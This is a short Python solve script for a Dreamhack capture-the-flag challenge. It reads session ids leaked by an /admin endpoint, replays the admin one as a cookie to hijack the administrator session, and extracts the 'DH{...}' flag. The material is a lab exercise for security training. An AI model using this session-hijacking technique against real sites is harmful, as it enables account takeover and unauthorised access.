import re
from requests import request as req

url = "http://host8.dreamhack.games:8256/"


def get_admin_session_id():
    res = req(
        url=f"{url}/admin",
        method="GET",
    ).json()

    admin_session_id = next((k for k, v in res.items() if v == "admin"), None)

    if not admin_session_id:
        raise AttributeError("NOT FOUND ADMIN KEY")

    return admin_session_id


def main():
    admin_session_id = get_admin_session_id()
    res = req(url=f"{url}", method="GET", cookies={"sessionid": admin_session_id})

    match = re.search("DH{.*}", res.text)
    print(match.group() if match else "NO FLAG")


main()
